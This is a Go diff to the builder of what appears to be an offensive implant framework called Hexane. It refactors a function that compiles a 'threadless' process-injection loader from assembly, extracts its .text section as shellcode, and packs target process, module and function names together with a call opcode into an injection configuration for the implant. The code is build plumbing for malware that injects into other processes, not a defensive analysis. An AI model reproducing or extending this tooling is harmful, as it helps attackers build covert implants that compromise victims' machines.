@@ -5,53 +5,52 @@ import (
 	"os"
 )
 
-func (h *HexaneConfig) GetInjectConfig() (*InjectConfig, error) {
+type Injection struct {
+}
+
+func (h *HexaneConfig) GetInjectConfig() (*Injection, error) {
 	var (
-		InjectCfg = new(InjectConfig)
-		err       error
+		err    error
+		loader []byte
 	)
 
-	if h.ImplantCFG.Injection.Threadless != nil {
-		var (
-			loader []byte
-			opcode = []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
-		)
+	InjectCfg := new(Injection)
+	opcode := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
 
-		LoaderAsm := h.CompilerCFG.BuildDirectory + "/threadless.asm"
-		LoaderObj := h.CompilerCFG.BuildDirectory + "/threadless.asm.o"
-		LoaderData := h.CompilerCFG.BuildDirectory + "/threadless.bin"
+	LoaderAsm := h.Compiler.BuildDirectory + "/threadless.asm"
+	LoaderObj := h.Compiler.BuildDirectory + "/threadless.asm.o"
+	LoaderData := h.Compiler.BuildDirectory + "/threadless.bin"
 
-		Execute := h.ImplantCFG.Injection.Threadless.Execute
-		InjectCfg.ExecuteObj = Execute + ".o"
+	Execute := h.Implant.Injection.Threadless.Execute
+	InjectCfg.ExecuteObj = Execute + ".o"
 
-		WrapMessage("DBG", fmt.Sprintf("generating execute object %s", Execute))
-		if err = h.CompileObject(h.CompilerCFG.Mingw+" -c ", InjectCfg.ExecuteObj, []string{Execute}, h.CompilerCFG.Flags, h.CompilerCFG.Includes, nil); err != nil {
-			return nil, err
-		}
+	WrapMessage("DBG", fmt.Sprintf("generating execute object %s", Execute))
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", InjectCfg.ExecuteObj, []string{Execute}, h.Compiler.Flags, h.Compiler.Includes, nil); err != nil {
+		return nil, err
+	}
 
-		WrapMessage("DBG", "generating Threadless loader object")
-		if err = h.CompileObject(h.CompilerCFG.Mingw+" -c ", LoaderObj, []string{LoaderAsm}, nil, h.CompilerCFG.Includes, nil); err != nil {
-			return nil, err
-		}
+	WrapMessage("DBG", "generating Threadless loader object")
+	if err = h.CompileObject(h.Compiler.Mingw+" -c ", LoaderObj, []string{LoaderAsm}, nil, h.Compiler.Includes, nil); err != nil {
+		return nil, err
+	}
 
-		WrapMessage("DBG", "extracting .text from loader object")
-		if err = h.RunCommand(h.CompilerCFG.Objcopy + " -j .text -O binary " + LoaderObj + ".o " + LoaderData); err != nil {
-			return nil, err
-		}
+	WrapMessage("DBG", "extracting .text from loader object")
+	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + ".o " + LoaderData); err != nil {
+		return nil, err
+	}
 
-		WrapMessage("DBG", "extracting loader shellcode")
-		if loader, err = os.ReadFile(LoaderData); err != nil {
-			return nil, err
-		}
+	WrapMessage("DBG", "extracting loader shellcode")
+	if loader, err = os.ReadFile(LoaderData); err != nil {
+		return nil, err
+	}
 
-		WrapMessage("DBG", "allocating injection strings config")
-		InjectCfg.Strings = []string{
-			h.ImplantCFG.Injection.Threadless.ProcName,
-			h.ImplantCFG.Injection.Threadless.ModuleName,
-			h.ImplantCFG.Injection.Threadless.FuncName,
-			string(opcode),
-			string(loader),
-		}
+	WrapMessage("DBG", "allocating injection strings config")
+	InjectCfg.Strings = []string{
+		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetProc,
+		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetModule,
+		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetFunc,
+		string(opcode),
+		string(loader),
 	}
 
 	return InjectCfg, nil
